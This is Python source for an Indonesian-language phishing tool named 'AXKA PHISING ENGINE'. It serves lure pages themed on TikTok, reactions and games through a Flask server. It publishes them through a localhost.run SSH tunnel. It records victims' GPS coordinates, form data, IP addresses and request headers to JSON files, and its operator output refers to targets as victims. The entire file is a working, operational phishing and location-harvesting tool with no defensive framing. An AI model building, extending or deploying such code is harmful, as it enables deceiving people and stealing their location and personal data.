# ==================== TEMPLATE MAP ====================

TEMPLATES = {
    'suntiktt': SUNTIK_HTML,
    'reacth': REACT_HTML,
    'game': GAME_HTML
}

# ==================== FUNGSI SERVER ====================

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def kill_port(port):
    try:
        if os.name == 'nt':
            subprocess.run(f'netstat -ano | findstr :{port} | findstr LISTENING', shell=True, capture_output=True)
        else:
            subprocess.run(f'fuser -k {port}/tcp', shell=True, capture_output=True)
            subprocess.run(f'pkill -f "python.*:{port}"', shell=True, capture_output=True)
        time.sleep(1)
        return True
    except:
        return False

def get_system_info_real():
    info = {
        'hostname': socket.gethostname(),
        'ip_local': socket.gethostbyname(socket.gethostname()),
        'platform': platform.system(),
        'platform_release': platform.release(),
        'platform_version': platform.version(),
        'processor': platform.processor(),
        'machine': platform.machine(),
        'architecture': str(platform.architecture()),
        'python_version': platform.python_version(),
        'time': datetime.now().isoformat()
    }
    
    try:
        with open('/proc/cpuinfo', 'r') as f:
            cpuinfo = f.read()
            cores = cpuinfo.count('processor')
            if cores > 0:
                info['cpu_count'] = cores
            for line in cpuinfo.split('\n'):
                if 'model name' in line or 'Hardware' in line:
                    info['processor_model'] = line.split(':')[1].strip()
                    break
    except:
        info['cpu_count'] = 0
        info['processor_model'] = 'Tidak diketahui'
    
    try:
        with open('/proc/meminfo', 'r') as f:
            meminfo = f.read()
            for line in meminfo.split('\n'):
                if 'MemTotal' in line:
                    mem_total = int(line.split(':')[1].strip().split()[0])
                    info['memory_total_mb'] = mem_total // 1024
                    info['memory_total_gb'] = round(mem_total / (1024 * 1024), 2)
                    break
    except:
        info['memory_total_mb'] = 0
        info['memory_total_gb'] = 0
    
    try:
        info['ip_public'] = requests.get('https://api.ipify.org', timeout=5).text
    except:
        try:
            info['ip_public'] = requests.get('https://httpbin.org/ip', timeout=5).json().get('origin', 'Tidak terdeteksi')
        except:
            info['ip_public'] = 'Tidak terdeteksi'
    
    try:
        geo = requests.get('https://ipapi.co/json/', timeout=5).json()
        info['geoip'] = {
            'city': geo.get('city', 'Tidak diketahui'),
            'region': geo.get('region', 'Tidak diketahui'),
            'country': geo.get('country_name', 'Tidak diketahui'),
            'lat': geo.get('latitude', 0),
            'lon': geo.get('longitude', 0),
            'isp': geo.get('org', 'Tidak diketahui')
        }
    except:
        info['geoip'] = {}
    
    return info

def display_result(data, template_type):
    info = data.get('system_info', {})
    location = data.get('location', {})
    user_data = data.get('user_data', {})
    
    lat = location.get('lat', 0)
    lon = location.get('lon', 0)
    accuracy = location.get('accuracy', 0)
    
    if accuracy < 50:
        acc_level = 'SANGAT AKURAT 🟢'
    elif accuracy < 200:
        acc_level = 'AKURAT 🟡'
    elif accuracy < 1000:
        acc_level = 'CUKUP AKURAT 🟠'
    else:
        acc_level = 'PERKIRAAN 🔴'
    
    print()
    print(f"{Fore.CYAN}╔{'═' * 70}╗{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.GREEN}📊 HASIL PHISING {Fore.YELLOW}{template_type.upper()}{Style.RESET_ALL}{' ' * (70 - 21 - len(template_type))}{Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╠{'═' * 70}╣{Style.RESET_ALL}")
    
    if user_data:
        print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.WHITE}📝 DATA USER{Style.RESET_ALL}{' ' * 59}{Fore.CYAN}║{Style.RESET_ALL}")
        for key, val in user_data.items():
            if key not in ['systemInfo', 'location', 'timestamp', 'timestampLocal', 'accuracy_level', 'location_source']:
                val_str = str(val)[:55]
                print(f"{Fore.CYAN}║{Style.RESET_ALL}     {Fore.YELLOW}{key}: {val_str}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╠{'─' * 70}╣{Style.RESET_ALL}")
    
    print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.WHITE}🖥️ SPESIFIKASI{Style.RESET_ALL}{' ' * 57}{Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}     {Fore.YELLOW}Hostname: {info.get('hostname', '-')}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}     {Fore.YELLOW}Platform: {info.get('platform', '-')} {info.get('platform_release', '')}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}     {Fore.YELLOW}Processor: {info.get('processor_model', '-')[:40]}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}     {Fore.YELLOW}CPU Core: {info.get('cpu_count', 0)}{Style.RESET_ALL}")
    mem_gb = info.get('memory_total_gb', 0)
    if mem_gb > 0:
        print(f"{Fore.CYAN}║{Style.RESET_ALL}     {Fore.YELLOW}RAM Total: {mem_gb} GB{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}     {Fore.YELLOW}IP Local: {info.get('ip_local', '-')}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}     {Fore.YELLOW}IP Public: {info.get('ip_public', '-')}{Style.RESET_ALL}")
    
    geo = info.get('geoip', {})
    if geo:
        print(f"{Fore.CYAN}║{Style.RESET_ALL}     {Fore.YELLOW}GeoIP: {geo.get('city', '-')}, {geo.get('country', '-')}{Style.RESET_ALL}")
    
    print(f"{Fore.CYAN}╠{'─' * 70}╣{Style.RESET_ALL}")
    
    maps_link = f"https://www.google.com/maps?q={lat},{lon}"
    print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.WHITE}📍 LOKASI GPS {Fore.GREEN}[{acc_level}]{Style.RESET_ALL}{' ' * (70 - 22 - len(acc_level))}{Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}     {Fore.YELLOW}Kota: {location.get('city', '-')}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}     {Fore.YELLOW}Provinsi: {location.get('region', '-')}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}     {Fore.YELLOW}Negara: {location.get('country', '-')}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}     {Fore.YELLOW}Koordinat: {lat:.6f}, {lon:.6f}{Style.RESET_ALL}")
    if accuracy > 0:
        print(f"{Fore.CYAN}║{Style.RESET_ALL}     {Fore.YELLOW}Akurasi: {accuracy:.0f} meter{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}     {Fore.CYAN}🔗 Maps: {maps_link}{Style.RESET_ALL}")
    
    print(f"{Fore.CYAN}╠{'═' * 70}╣{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.GREEN}✅ Data berhasil dikumpulkan!{Style.RESET_ALL}{' ' * 38}{Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╚{'═' * 70}╝{Style.RESET_ALL}")

def run_server(template):
    try:
        from flask import Flask, request, jsonify
        
        app = Flask(__name__)
        CORS(app, resources={r"/*": {"origins": "*"}})
        
        @app.route('/')
        def index():
            return TEMPLATES.get(template, '<h1>Template tidak ditemukan</h1>')
        
        @app.route('/api/process', methods=['POST'])
        def process():
            data = request.json
            
            sys_info = get_system_info_real()
            
            loc = data.get('location', {})
            sys_info.update({
                'city': loc.get('city', 'Tidak diketahui'),
                'region': loc.get('region', 'Tidak diketahui'),
                'country': loc.get('country', 'Tidak diketahui'),
                'lat': loc.get('lat', 0),
                'lon': loc.get('lon', 0),
                'accuracy': loc.get('accuracy', 0),
                'accuracy_level': data.get('accuracy_level', 'Tidak diketahui'),
                'location_source': data.get('location_source', 'Tidak diketahui'),
                'maps_link': f"https://www.google.com/maps?q={loc.get('lat', 0)},{loc.get('lon', 0)}"
            })
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = os.path.join(PHIS_DIR, f"{template}_{timestamp}.json")
            with open(filename, 'w') as f:
                json.dump({
                    'template': template,
                    'timestamp': timestamp,
                    'system_info': sys_info,
                    'user_data': data,
                    'client_ip': request.remote_addr,
                    'client_headers': dict(request.headers)
                }, f, indent=2, default=str)
            
            result = {
                'success': True,
                'message': '✅ Data berhasil dikirim!',
                'system_info': sys_info,
                'location': loc,
                'user_data': data,
                'template': template,
                'timestamp': datetime.now().isoformat()
            }
            
            display_result(result, template)
            print(f"\n{Fore.GREEN}📁 Data disimpan di: {filename}{Style.RESET_ALL}")
            
            return jsonify(result)
        
        def run_flask():
            app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False, threaded=True)
        
        thread = threading.Thread(target=run_flask, daemon=True)
        thread.start()
        return app, thread
        
    except ImportError as e:
        print(f"{Fore.RED}❌ Error: {e}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Install: pip install flask flask-cors{Style.RESET_ALL}")
        return None, None

# ==================== LOCALHOST.RUN TUNNEL ====================

def start_localhost_run(port=PORT):
    """Menjalankan localhost.run dengan SSH key"""
    ssh_key_path = os.path.expanduser('~/.ssh/localhostrun')
    
    # Cek SSH key
    if not os.path.exists(ssh_key_path):
        print(f"{Fore.YELLOW}⚠️ SSH key tidak ditemukan!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Generate SSH key:{Style.RESET_ALL}")
        print(f"  ssh-keygen -t rsa -b 4096 -f ~/.ssh/localhostrun")
        print(f"{Fore.CYAN}Daftarkan ke localhost.run:{Style.RESET_ALL}")
        print(f"  cat ~/.ssh/localhostrun.pub | ssh -p 22 localhost.run")
        return None, None
    
    try:
        cmd = [
            'ssh',
            '-i', ssh_key_path,
            '-o', 'ServerAliveInterval=30',
            '-o', 'ServerAliveCountMax=10',
            '-o', 'StrictHostKeyChecking=no',
            '-o', 'TCPKeepAlive=yes',
            '-R', f'80:localhost:{port}',
            'localhost.run'
        ]
        
        print(f"{Fore.YELLOW}⏳ Menjalankan localhost.run tunnel...{Style.RESET_ALL}")
        
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        
        url = None
        timeout = 45
        start_time = time.time()
        
        # Pola URL localhost.run
        url_pattern = re.compile(r'https://[a-zA-Z0-9\-\.]+\.lhr\.life')
        url_pattern2 = re.compile(r'https://[a-zA-Z0-9\-\.]+\.lhrtunnel\.link')
        
        print(f"{Fore.CYAN}⏳ Mencari URL... (maks {timeout} detik){Style.RESET_ALL}")
        
        while time.time() - start_time < timeout:
            try:
                line = process.stdout.readline()
                if line:
                    line = line.strip()
                    print(f"{Fore.CYAN}ℹ️ {line}{Style.RESET_ALL}")
                    
                    if 'https://' in line and not url:
                        match = url_pattern.search(line) or url_pattern2.search(line)
                        if match:
                            url = match.group(0)
                            print()
                            print(f"{Fore.GREEN}✅✅✅ LOCALHOST.RUN TUNNEL AKTIF! ✅✅✅{Style.RESET_ALL}")
                            print(f"{Fore.CYAN}🔗 URL: {Fore.YELLOW}{url}{Style.RESET_ALL}")
                            print(f"{Fore.CYAN}📱 Buka URL di browser korban{Style.RESET_ALL}")
                            print()
                            
                            # Simpan URL ke file
                            with open(os.path.join(PHIS_DIR, 'tunnel_url.txt'), 'w') as f:
                                f.write(url)
                            break
                    
                    if 'Permission denied' in line or 'Connection refused' in line:
                        print(f"{Fore.RED}❌ Error: {line}{Style.RESET_ALL}")
                        break
            except:
                pass
            time.sleep(0.1)
        
        if not url:
            print(f"{Fore.YELLOW}⚠️ URL belum muncul, tunggu beberapa saat...{Style.RESET_ALL}")
            print(f"{Fore.CYAN}💡 Cek manual: ssh -i ~/.ssh/localhostrun -R 80:localhost:{port} localhost.run{Style.RESET_ALL}")
        
        return url, process
        
    except Exception as e:
        print(f"{Fore.RED}❌ Error localhost.run: {e}{Style.RESET_ALL}")
        return None, None

# ==================== MENU ====================

def phising_menu():
    clear_screen()
    print(f"{Fore.CYAN}┌{'─' * 70}┐{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│{Style.RESET_ALL}  {Fore.RED}🎯 AXKA PHISING ENGINE v3.1{Style.RESET_ALL}{' ' * 40}{Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│{Style.RESET_ALL}  {Fore.WHITE}localhost.run | GPS Akurat 95%+{Style.RESET_ALL}{' ' * 32}{Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}└{'─' * 70}┘{Style.RESET_ALL}")
    print()
    print(f"{Fore.YELLOW}Pilih Tampilan Phising:{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}[1]{Style.RESET_ALL} 💉 Suntik TikTok")
    print(f"  {Fore.CYAN}[2]{Style.RESET_ALL} ❤️ Reacth CH")
    print(f"  {Fore.CYAN}[3]{Style.RESET_ALL} 🎮 Game Center")
    print(f"  {Fore.CYAN}[4]{Style.RESET_ALL} 📱 List Data")
    print(f"  {Fore.CYAN}[5]{Style.RESET_ALL} 🔄 Keluar")
    print()
    
    choice = input(f"{Fore.WHITE}Pilih (1-5): {Style.RESET_ALL}").strip()
    
    templates = {
        '1': 'suntiktt',
        '2': 'reacth',
        '3': 'game'
    }
    
    if choice in ['1', '2', '3']:
        template = templates[choice]
        run_phising(template)
    elif choice == '4':
        list_data()
    elif choice == '5':
        print(f"\n{Fore.GREEN}Terima kasih!{Style.RESET_ALL}")
        sys.exit(0)
    else:
        print(f"\n{Fore.RED}❌ Pilihan tidak valid!{Style.RESET_ALL}")
        time.sleep(1)
        phising_menu()

def list_data():
    clear_screen()
    print(f"{Fore.CYAN}┌{'─' * 70}┐{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│{Style.RESET_ALL}  {Fore.WHITE}📁 DATA PHISING TERKUMPUL{Style.RESET_ALL}{' ' * 42}{Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}└{'─' * 70}┘{Style.RESET_ALL}")
    print()
    
    files = os.listdir(PHIS_DIR)
    json_files = [f for f in files if f.endswith('.json')]
    
    if not json_files:
        print(f"{Fore.YELLOW}⚠️ Belum ada data.{Style.RESET_ALL}")
        print()
        input(f"{Fore.WHITE}Tekan Enter untuk kembali...{Style.RESET_ALL}")
        phising_menu()
        return
    
    print(f"{Fore.GREEN}📊 Total {len(json_files)} data tersimpan{Style.RESET_ALL}")
    print()
    
    for i, filename in enumerate(json_files, 1):
        filepath = os.path.join(PHIS_DIR, filename)
        try:
            with open(filepath, 'r') as f:
                data = json.load(f)
            template = data.get('template', 'unknown')
            timestamp = data.get('timestamp', 'unknown')
            sys_info = data.get('system_info', {})
            acc = sys_info.get('accuracy', 0)
            acc_text = f"{acc:.0f}m" if acc > 0 else "N/A"
            print(f"{Fore.CYAN}{i}.{Style.RESET_ALL} {Fore.YELLOW}{template}{Style.RESET_ALL} - {timestamp}")
            print(f"   📍 {sys_info.get('city', '-')}, {sys_info.get('country', '-')} | 🎯 {acc_text}")
            print(f"   🖥️ {sys_info.get('platform', '-')} | {sys_info.get('ip_public', '-')}")
            print()
        except:
            print(f"{Fore.CYAN}{i}.{Style.RESET_ALL} {Fore.RED}{filename} (error membaca){Style.RESET_ALL}")
            print()
    
    print(f"{Fore.YELLOW}📂 Folder: {PHIS_DIR}{Style.RESET_ALL}")
    print()
    input(f"{Fore.WHITE}Tekan Enter untuk kembali...{Style.RESET_ALL}")
    phising_menu()

def run_phising(template):
    clear_screen()
    
    print(f"{Fore.CYAN}┌{'─' * 70}┐{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│{Style.RESET_ALL}  {Fore.RED}🎯 RUNNING PHISING{Style.RESET_ALL}{' ' * 53}{Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}└{'─' * 70}┘{Style.RESET_ALL}")
    print()
    
    print(f"{Fore.CYAN}📂 Template : {Fore.YELLOW}{template}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}🔌 Port     : {Fore.YELLOW}{PORT}{Style.RESET_ALL}")
    print()
    
    print(f"{Fore.YELLOW}⏳ Membersihkan port {PORT}...{Style.RESET_ALL}")
    kill_port(PORT)
    
    print(f"{Fore.YELLOW}⏳ Menjalankan server...{Style.RESET_ALL}")
    app, thread = run_server(template)
    
    if not app:
        print(f"{Fore.RED}❌ Gagal menjalankan server!{Style.RESET_ALL}")
        time.sleep(2)
        phising_menu()
        return
    
    time.sleep(2)
    
    print(f"{Fore.YELLOW}⏳ Menjalankan localhost.run tunnel...{Style.RESET_ALL}")
    url, cf_process = start_localhost_run(PORT)
    
    print()
    print(f"{Fore.GREEN}✅ Server berjalan!{Style.RESET_ALL}")
    print(f"{Fore.CYAN}💡 Tekan {Fore.RED}CTRL+C{Fore.CYAN} untuk berhenti{Style.RESET_ALL}")
    print()
    
    if url:
        print(f"{Fore.CYAN}🔗 URL Public: {Fore.YELLOW}{url}{Style.RESET_ALL}")
        print()
    else:
        print(f"{Fore.YELLOW}⚠️ URL belum muncul, tunggu beberapa saat...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}💡 Cek manual dengan perintah di atas{Style.RESET_ALL}")
        print()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print()
        print(f"{Fore.YELLOW}⏳ Menghentikan server...{Style.RESET_ALL}")
        kill_port(PORT)
        if cf_process:
            cf_process.terminate()
            time.sleep(1)
            cf_process.kill()
        print(f"{Fore.GREEN}✅ Server berhenti{Style.RESET_ALL}")
        print()
        print(f"{Fore.YELLOW}⏎ Tekan Enter untuk kembali...{Style.RESET_ALL}")
        input()
        phising_menu()

def check_dependencies():
    dependencies = [
        ('flask', 'Flask'),
        ('flask_cors', 'Flask-CORS'),
        ('requests', 'requests'),
        ('colorama', 'colorama')
    ]
    
    missing = []
    for module, package in dependencies:
        try:
            __import__(module)
        except ImportError:
            missing.append(package)
    
    if missing:
        print(f"{Fore.YELLOW}⚠️ Beberapa package diperlukan:{Style.RESET_ALL}")
        for pkg in missing:
            print(f"   {Fore.CYAN}pip install {pkg}{Style.RESET_ALL}")
        print()
        install = input(f"{Fore.WHITE}Install sekarang? (y/n): {Style.RESET_ALL}").strip().lower()
        if install == 'y':
            for pkg in missing:
                print(f"{Fore.YELLOW}Installing {pkg}...{Style.RESET_ALL}")
                subprocess.run([sys.executable, '-m', 'pip', 'install', pkg], capture_output=True)
            print(f"{Fore.GREEN}✅ Selesai!{Style.RESET_ALL}")
            time.sleep(1)

if __name__ == "__main__":
    check_dependencies()
    phising_menu()